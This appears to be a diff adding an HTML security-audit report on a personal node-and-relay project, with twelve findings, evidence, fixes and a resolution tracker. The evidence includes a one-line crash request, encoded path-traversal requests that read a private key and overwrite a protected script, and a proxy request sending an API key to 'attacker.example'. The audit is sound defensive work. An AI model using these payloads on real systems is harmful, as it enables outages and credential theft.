+          <div class="evidence-label">Against a live <code>--relay</code> process</div>
+<pre><span class="in">$ curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:65440/</span>
+200
+<span class="in">$ curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:65440/%zz</span>
+<span class="bad">000</span>
+<span class="in">$ curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:65440/</span>
+<span class="bad">000                                    # relay is gone</span>
+
+<span class="bad">URIError: URI malformed</span>
+    at Server.&lt;anonymous&gt; (js/server.js:498:20)</pre>
+        </div>
+        <p>
+          The systemd unit sets <code>Restart=on-failure</code> / <code>RestartSec=3</code>, so a
+          single request costs about three seconds of downtime — but a loop keeps
+          <span class="path">spirit.andyflinn.com</span> off the air indefinitely from one line of
+          curl, re-reading mailbox state on every restart.
+        </p>
+        <div class="fix"><b>Fix</b>Wrap the decode in try/catch and answer 400. Add
+          <code>process.on('uncaughtException')</code> and <code>server.on('clientError')</code>
+          as backstops so the next parse bug is a bad response, not a dead host.</div>
+      </div>
+    </div>
+  </article>
+
+  <!-- 2 -->
+  <article class="finding" data-id="f2" data-sev="crit">
+    <input type="checkbox" class="check" aria-labelledby="f2-t">
+    <div>
+      <div class="fhead">
+        <span class="fnum">02</span>
+        <h3 class="ftitle" id="f2-t">Both filesystem gates are bypassable with non-canonical paths</h3>
+        <span class="chip crit">Critical</span>
+        <span class="chip ev e2e">Verified E2E</span>
+      </div>
+      <div class="fbody">
+        <p>
+          <code>fileServable</code> and <code>fileWritable</code>
+          (<span class="path">kernel.js:196–224</span>) pattern-match the <strong>raw request
+          string</strong>, while <code>fsPath</code> resolves it separately. The two disagree, and
+          the filesystem obeys the second one.
+        </p>
+
+        <div class="gate-wrap">
+          <table class="gate">
+            <thead>
+              <tr><th>Path as handed to the gate</th><th>Gate's verdict</th><th>What the filesystem resolves</th></tr>
+            </thead>
+            <tbody>
+              <tr><td class="p">relay-state/identity.json</td><td><span class="verdict shut">Blocked</span></td><td class="res">—</td></tr>
+              <tr><td class="p">./relay-state/identity.json</td><td><span class="verdict open">Servable</span></td><td class="res leak">the Ed25519 private key</td></tr>
+              <tr><td class="p">x/../js/relayAuth.js</td><td><span class="verdict open">Servable</span></td><td class="res leak">the signature-verification module</td></tr>
+              <tr><td class="p">app/natter/natter.js</td><td><span class="verdict shut">Not writable</span></td><td class="res">—</td></tr>
+              <tr><td class="p">app/./natter/natter.js</td><td><span class="verdict open">Writable</span></td><td class="res leak">a protected app entry script</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>
+          Over HTTP the read path survives via encoded slashes: the WHATWG URL parser collapses a
+          literal <code>../</code>, but <code>%2f</code> reaches <code>decodeURIComponent</code>
+          intact and is only then rejoined into a path.
+        </p>
+
+        <div class="evidence">
+          <div class="evidence-label">Read gate — private key served over HTTP</div>
+<pre><span class="in">$ curl -s -w "\n[HTTP %{http_code}]\n" \
+    "http://localhost:65439/x%2f..%2frelay-state%2fidentity.json"</span>
+<span class="bad">{"name":"fake","publicKey":"FAKE_PUB","privateKey":"FAKE_PRIVATE_KEY_SENTINEL_12345"}</span>
+<span class="bad">[HTTP 200]</span></pre>
+        </div>
+
+        <div class="evidence">
+          <div class="evidence-label">Write gate — "protected from every tool" entry script overwritten</div>
+<pre><span class="in">$ curl -s -w "\n[HTTP %{http_code}]\n" -X POST /api/fs/save \
+    -d '{"path":"app/./natter/natter.js","content":"PWNED"}'</span>
+<span class="bad">[HTTP 204]</span>
+
+<span class="in">$ head -c 40 spirit/run/app/natter/natter.js</span>
+<span class="bad">PWNED</span>
+
+<span class="in">$ git checkout -- spirit/run/app/natter/natter.js   # restored</span>
+<span class="ok">working tree clean</span></pre>
+        </div>
+
+        <p>
+          Scope, stated plainly: reads stay behind loopback on a personal node, and a
+          <code>--relay</code> never exposes the static route at all — so this is a local boundary
+          failure, not an internet-facing one. But it defeats two invariants the code states
+          outright, including "protected everywhere, from every tool."
+        </p>
+        <div class="fix"><b>Fix — one shape change</b>Resolve with <code>fsPath</code> <em>first</em>,
+          derive the ROOT_DIR-relative forward-slashed path from the result, and run every pattern
+          against that canonical form. One change closes both gates and the whole class.</div>
+      </div>
+    </div>
+  </article>
+
+  <!-- 3 -->
+  <article class="finding" data-id="f3" data-sev="high">
+    <input type="checkbox" class="check" aria-labelledby="f3-t">
+    <div>
+      <div class="fhead">
+        <span class="fnum">03</span>
+        <h3 class="ftitle" id="f3-t">escapeHtml is not attribute-safe</h3>
+        <span class="chip high">High</span>
+        <span class="chip ev">Verified locally</span>
+      </div>
+      <div class="fbody">
+        <p>
+          <span class="path">shell.js:782</span> escapes by round-tripping through
+          <code>textContent</code> → <code>innerHTML</code>, which handles <code>&amp;</code>,
+          <code>&lt;</code> and <code>&gt;</code> but <strong>not quotes</strong> — and it is used
+          in roughly thirty attribute contexts. Two of those take input the operator did not write:
+        </p>
+        <p>
+          <strong>Filenames.</strong> <span class="path">index.html:474–475</span> places
+          <code>entry.name</code> and <code>entry.relativePath</code> into
+          <code>data-name="…"</code>. A double quote is legal in a POSIX filename.<br>
+          <strong>App name and icon overrides.</strong> <span class="path">index.html:1099,1106</span>
+          place them into <code>value="…"</code> and persist them to
+          <span class="path">preferences.json</span> — itself a writable root file any app can write.
+        </p>
+        <p>
+          Scoped honestly: apps already share the page's realm, and shell.js's own comment frames
+          <code>api</code> as shrinking what an app <em>sees</em> rather than as a sandbox. So this
+          is stored XSS, not a sandbox escape. The filename vector is the one that matters, because
+          that content arrives from outside.
+        </p>
+        <div class="fix"><b>Fix</b>Replace the <code>textContent</code> trick with an explicit
+          replace chain that also covers <code>"</code> and <code>'</code> — or set those
+          attributes through <code>setAttribute</code> / <code>dataset</code> and stop building
+          them by concatenation.</div>
+      </div>
+    </div>
+  </article>
+
+  <!-- 4 -->
+  <article class="finding" data-id="f4" data-sev="high">
+    <input type="checkbox" class="check" aria-labelledby="f4-t">
+    <div>
+      <div class="fhead">
+        <span class="fnum">04</span>
+        <h3 class="ftitle" id="f4-t">/api/proxy will send your Anthropic key to any host named</h3>
+        <span class="chip high">High</span>
+        <span class="chip ev">By inspection</span>
+      </div>
+      <div class="fbody">
+        <p>
+          <code>PROXY_ENV_SUBSTITUTION_ALLOWLIST</code> gates <em>which environment variable</em>
+          may be substituted, never <em>which destination</em> it may be substituted for.
+        </p>
+        <div class="evidence">
+          <div class="evidence-label">Request body that exfiltrates the real key</div>
+<pre>POST /api/proxy
+{
+  "url": <span class="bad">"https://attacker.example"</span>,
+  "headers": { "x-api-key": <span class="bad">"${ENV:ANTHROPIC_API_KEY}"</span> }
+}</pre>
+        </div>
+        <p>
+          The code comment's claim — that this cannot "leak an unrelated server env var to an
+          arbitrary URL a caller names" — is true for <em>unrelated</em> variables. The allowlisted
+          one goes wherever it is pointed.
+        </p>
+        <div class="fix"><b>Fix</b>Make the allowlist entries pairs, not names: bind
+          <code>ANTHROPIC_API_KEY</code> to <span class="path">api.anthropic.com</span> and
+          substitute only when the outbound URL's host matches.</div>
+      </div>
+    </div>
+  </article>
+
+  <!-- 5 -->
+  <article class="finding" data-id="f5" data-sev="high">
+    <input type="checkbox" class="check" aria-labelledby="f5-t">
+    <div>
+      <div class="fhead">
+        <span class="fnum">05</span>
+        <h3 class="ftitle" id="f5-t">Relay inbox reads are unauthenticated</h3>
+        <span class="chip high">High</span>
+        <span class="chip ev">By inspection</span>
+      </div>
+      <div class="fbody">
+        <p>
+          <code>claim</code> and <code>send</code> are signature-gated in keys mode.
+          <code>inbox</code> takes a bare <code>?name=</code> and returns that peer's messages to
+          anyone who asks. On a public relay, every mailbox is world-readable by name.
+        </p>
+        <p>
+          <span class="path">server.js</span> asserts that "the mailbox routes themselves are gated
+          by the allow list and signature checks in relayAuth.js" — accurate for two of the three
+          routes.
+        </p>
+        <div class="fix"><b>Fix</b>Require a signature over the requested name for inbox reads,
+          the same way <code>claim</code> does — or narrow the comment so the gap is on the record
+          rather than papered over.</div>
+      </div>
+    </div>
+  </article>
+
+  <!-- 6 -->
+  <article class="finding" data-id="f6" data-sev="mod">
+    <input type="checkbox" class="check" aria-labelledby="f6-t">
+    <div>
+      <div class="fhead">
+        <span class="fnum">06</span>
+        <h3 class="ftitle" id="f6-t">Relay rate limiting is per-name and grows without bound</h3>
+        <span class="chip mod">Moderate</span>
+        <span class="chip ev">By inspection</span>
+      </div>
+      <div class="fbody">
+        <p>
+          <code>rateOk</code> keys its buckets on the caller-supplied <code>from</code>, so rotating
+          the name yields a fresh 30-per-minute budget every time. The buckets are never pruned
+          when they empty, so each distinct name permanently costs memory — on a 1&nbsp;GB relay box.
+        </p>
+        <p>
+          <span class="path">relayAbuse.test.js</span> exercises a single fixed name and correctly
+          observes the 31st send returning 429, which is why the limit reads as covered.
+        </p>
+        <div class="fix"><b>Fix</b>Key limits on the connection's IP as well as the claimed name,
+          and evict buckets once their window empties.</div>
+      </div>
+    </div>
+  </article>
+
+  <!-- 7 -->
+  <article class="finding" data-id="f7" data-sev="mod">
+    <input type="checkbox" class="check" aria-labelledby="f7-t">
+    <div>
+      <div class="fhead">
+        <span class="fnum">07</span>
+        <h3 class="ftitle" id="f7-t">A relay with no allow.json boots silently wide open</h3>
+        <span class="chip mod">Moderate</span>
+        <span class="chip ev">By inspection</span>
+      </div>
+      <div class="fbody">
+        <p>
+          <code>loadAllow</code> treats a missing or unparseable
+          <span class="path">relay-state/allow.json</span> as <code>mode:'open'</code> — anyone may
+          claim any name, send as anyone, and read anything. The README says to create the file on
+          the host; nothing checks that you did.
+        </p>
+        <p>
+          The failure mode is invisible: an open relay looks exactly like a working one until
+          someone else claims your name.
+        </p>
+        <div class="fix"><b>Fix</b>Log a single unmissable warning when a <code>--relay</code>
+          starts in open mode. Cheap, and it converts a silent default into a visible choice.</div>
+      </div>
+    </div>
+  </article>
+
+  <!-- 8 -->
+  <article class="finding" data-id="f8" data-sev="mod">
+    <input type="checkbox" class="check" aria-labelledby="f8-t">
+    <div>
+      <div class="fhead">
+        <span class="fnum">08</span>
+        <h3 class="ftitle" id="f8-t">The relay runs as root, and pulls master every ten minutes</h3>
+        <span class="chip mod">Moderate</span>
+        <span class="chip ev">By inspection</span>
+      </div>
+      <div class="fbody">
+        <p>
+          The systemd unit has no <code>User=</code>, so node runs as root, and
+          <span class="path">bash/cron-install</span> hard-resets to <code>origin/master</code>
+          every ten minutes. Anything reaching the GitHub branch is root on the box within ten
+          minutes, with no gate in between.
+        </p>
+        <p>
+          That is a defensible trade for a single operator who owns both ends — but the process
+          listening on :65430 has no need of root either way.
+        </p>
+        <div class="fix"><b>Fix</b>Add <code>User=spirit</code>, <code>NoNewPrivileges=yes</code>
+          and <code>ProtectSystem=strict</code> with <code>ReadWritePaths=</code> for the
+          relay-state directory. The auto-deploy can stay; the privilege need not.</div>
+      </div>
+    </div>
+  </article>
+
+  <!-- 9 -->
+  <article class="finding" data-id="f9" data-sev="mod">
+    <input type="checkbox" class="check" aria-labelledby="f9-t">
+    <div>
+      <div class="fhead">
+        <span class="fnum">09</span>
+        <h3 class="ftitle" id="f9-t">The harness only ever feeds its gates canonical paths</h3>
+        <span class="chip mod">Moderate</span>
+        <span class="chip ev">Verified locally</span>
+      </div>
+      <div class="fbody">
+        <p>
+          This is the finding behind finding 02. The suite is real and it passes —
+          <code>pathJail</code>, <code>servableAssets</code>, <code>writableRoots</code> and
+          <code>circularity</code> report 102 successes against the current tree. But every denied
+          path is asserted in exactly one spelling.
+        </p>
+        <div class="evidence">
+          <div class="evidence-label">The suite, run against the bypassable gate</div>
+<pre><span class="in">$ node pathJail.js       </span><span class="ok">✅:13</span>
+<span class="in">$ node servableAssets.js </span><span class="ok">✅:68</span>
+<span class="in">$ node writableRoots.js  </span><span class="ok">✅:20</span>
+<span class="in">$ node circularity.js    </span><span class="ok">✅:1     — 102 passing</span>
+
+<span class="bad"># meanwhile pathJail.js asserts, as a PASS:</span>
+<span class="bad">#   loadFile('./index.html') !== null</span>
+<span class="bad"># which is the exact bypass, one directory over.</span></pre>
+        </div>
+        <div class="fix"><b>Fix</b>For each denied path already asserted, assert the non-canonical
+          spellings too: <code>./x</code>, <code>a/../x</code>, <code>x/.</code>, <code>a//x</code>.
+          That table in finding 02 is the test case.</div>
+      </div>
+    </div>
+  </article>
+
+  <!-- 10 -->
+  <article class="finding" data-id="f10" data-sev="low">
+    <input type="checkbox" class="check" aria-labelledby="f10-t">
+    <div>
+      <div class="fhead">
+        <span class="fnum">10</span>
+        <h3 class="ftitle" id="f10-t">A failed fs-watcher becomes an undeletable job</h3>
+        <span class="chip low">Low</span>
+        <span class="chip ev">By inspection</span>
+      </div>
+      <div class="fbody">
+        <p>
+          <span class="path">jobs.js:151</span> sets <code>status: 'error'</code>, which is not in
+          <code>TERMINAL_STATUSES</code>. <code>deleteJob</code> refuses any non-terminal job, so
+          the dead watcher can never be cleared from the Jobs list.
+        </p>
+        <div class="fix"><b>Fix</b>Use <code>'failed'</code>, which is already in the set and
+          already rendered.</div>
+      </div>
+    </div>
+  </article>
+
+  <!-- 11 -->
+  <article class="finding" data-id="f11" data-sev="low">
+    <input type="checkbox" class="check" aria-labelledby="f11-t">
+    <div>
+      <div class="fhead">
+        <span class="fnum">11</span>
+        <h3 class="ftitle" id="f11-t">The eleventh open tab warns on the console</h3>
+        <span class="chip low">Low</span>
+        <span class="chip ev">By inspection</span>
+      </div>
+      <div class="fbody">
+        <p>
+          Each SSE connection adds two listeners to <code>jobs.events</code>, which never gets
+          <code>setMaxListeners</code>. Node's default of 10 means a MaxListenersExceededWarning
+          once enough tabs are open — noise that looks like a leak.
+        </p>
+        <div class="fix"><b>Fix</b>Call <code>events.setMaxListeners(0)</code> where the emitter is
+          created, with a line saying why it is deliberate.</div>
+      </div>
+    </div>
+  </article>
+
+  <!-- 12 -->
+  <article class="finding" data-id="f12" data-sev="low">
+    <input type="checkbox" class="check" aria-labelledby="f12-t">
+    <div>
+      <div class="fhead">
+        <span class="fnum">12</span>
+        <h3 class="ftitle" id="f12-t">SSE cleanup runs on close but not on error</h3>
+        <span class="chip low">Low</span>
+        <span class="chip ev">By inspection</span>
+      </div>
+      <div class="fbody">
+        <p>
+          <code>handleSseConnection</code> clears its heartbeat and detaches listeners on
+          <code>req.on('close')</code> only. A socket that errors without a clean close leaves the
+          20-second interval running against a dead response.
+        </p>
+        <div class="fix"><b>Fix</b>Hoist the teardown into one function and bind it to
+          <code>'error'</code> as well, guarded so it runs once.</div>
+      </div>
+    </div>
+  </article>
+
+  <h2>What is already right</h2>
+
+  <div class="credit">
+    <ul>
+      <li><b>The path jail itself is correct.</b> <code>fsPath</code> resolves and compares properly; every escape attempt in the suite is genuinely blocked. The problem in 02 sits beside it, not in it.</li>
+      <li><b>saveAppManifest force-sets <code>owner</code> server-side</b> rather than trusting the caller's JSON — exactly the right instinct, applied at exactly the right layer.</li>
+      <li><b>The <code>${ENV:…}</code> placeholder design</b> keeps the API key out of browser-visible code entirely. Finding 04 narrows its destination; the shape is sound.</li>
+      <li><b>The BOOT_ASSETS carve-out</b> is disciplined: a narrow, documented exception in the static route rather than a hole punched in the general predicate.</li>
+      <li><b>The comments explain why, not what</b> — including why the defaults were rejected. That is rare, and it is what made this review fast.</li>
+      <li><b>There is a real harness for the security boundaries at all.</b> Finding 09 is a gap in its inputs, not a case against it. Most projects this size have nothing to extend.</li>
+    </ul>
+  </div>
+
+  <h2>The through-line</h2>
+
+  <p class="thesis">
+    Every gate here is well-reasoned, and every one of them <strong>matches on an unvalidated input
+    string</strong>. The kernel already knows how to canonicalize — <code>fsPath</code> does it
+    correctly, three lines away. Canonicalize once, then check, and finding 02 closes along with
+    the whole class of bypasses that has not been found yet.
+  </p>
+
+  <footer>
+    <span>Reviewed at ddf3574</span>
+    <span>server · kernel · jobs · relay · hub · shell · bash</span>
+    <span>4 of 12 confirmed by execution</span>
+  </footer>
+
+</div>
+
+<script>
+(function () {
+  "use strict";
+
+  // Captured before any rendering touches the DOM, so a republish carries the
+  // authored document forward rather than a serialization of the live page.
+  var PRISTINE = document.documentElement.outerHTML;
+
+  var STATE_RE = /(<script id="audit-state" type="application\/json">)([\s\S]*?)(<\/script>)/;
+
+  var state = { done: [] };
+  try {
+    var raw = document.getElementById("audit-state").textContent;
+    var parsed = JSON.parse(raw);
+    if (parsed && Array.isArray(parsed.done)) state = { done: parsed.done };
+  } catch (e) { /* fall back to empty */ }
+
+  var findings = Array.prototype.slice.call(document.querySelectorAll(".finding"));
+  var fill = document.getElementById("fill");
+  var ptext = document.getElementById("ptext");
+  var syncEl = document.getElementById("sync");
+
+  var SEV = ["crit", "high", "mod", "low"];
+  var totals = { crit: 0, high: 0, mod: 0, low: 0 };
+  findings.forEach(function (f) { totals[f.dataset.sev]++; });
+
+  var artifactApi = null;
+  var readOnly = false;
+  var pending = null;
+
+  function isDone(id) { return state.done.indexOf(id) !== -1; }
+
+  function render() {
+    findings.forEach(function (f) {
+      var done = isDone(f.dataset.id);
+      f.classList.toggle("done", done);
+      var box = f.querySelector(".check");
+      box.checked = done;
+      box.disabled = readOnly;
+    });
+
+    var open = { crit: 0, high: 0, mod: 0, low: 0 };
+    findings.forEach(function (f) {
+      if (!isDone(f.dataset.id)) open[f.dataset.sev]++;
+    });
+    SEV.forEach(function (s) {
+      var el = document.getElementById("t-" + s);
+      el.textContent = open[s];
+      el.style.opacity = open[s] === 0 && totals[s] > 0 ? "0.35" : "1";
+    });
+
+    var n = state.done.length;
+    var total = findings.length;
+    fill.style.width = (total ? (n / total) * 100 : 0) + "%";
+    ptext.textContent = n + " of " + total + " resolved";
+  }
+
+  function setSync(msg) { syncEl.textContent = msg; }
+
+  function buildDocument() {
+    var payload = JSON.stringify({ done: state.done });
+    var next = PRISTINE.replace(STATE_RE, function (m, open, body, close) {
+      return open + payload + close;
+    });
+    return "<!doctype html>\n" + next;
+  }
+
+  function publish() {
+    if (!artifactApi || readOnly) return;
+    setSync("saving…");
+    artifactApi.publish(buildDocument()).then(function () {
+      setSync("saved");
+      setTimeout(function () { if (syncEl.textContent === "saved") setSync(""); }, 2000);
+    }, function (err) {
+      var code = err && err.code;
+      if (code === "conflict") {
+        // Every open view is already reloading to the winning version.
+        setSync("reloading to newer version");
+        return;
+      }
+      if (code === "not_writer" || code === "not_granted" ||
+          code === "not_declared" || code === "capability_disabled" ||
+          code === "capability_removed" || code === "consent_required") {
+        readOnly = true;
+        setSync("read-only view");
+        render();
+        return;
+      }
+      if (code === "rate_limited") { setSync("saving too fast — slowing down"); return; }
+      setSync("could not save");
+    });
+  }
+
+  function schedulePublish() {
+    if (pending) clearTimeout(pending);
+    pending = setTimeout(function () { pending = null; publish(); }, 600);
+  }
+
+  findings.forEach(function (f) {
+    f.querySelector(".check").addEventListener("change", function (ev) {
+      var id = f.dataset.id;
+      if (ev.target.checked) {
+        if (!isDone(id)) state.done.push(id);
+      } else {
+        state.done = state.done.filter(function (x) { return x !== id; });
+      }
+      render();
+      schedulePublish();
+    });
+  });
+
+  render();
+
+  if (window.claude && typeof window.claude.use === "function") {
+    setSync("connecting…");
+    window.claude.use("artifact").then(function (api) {
+      artifactApi = api;
+      if (!api) { setSync("not saved — local only"); return; }
+      setSync("");
+    }, function () { setSync("not saved — local only"); });
+  } else {
+    setSync("not saved — local only");
+  }
+})();
+</script>
+
+</body></html>
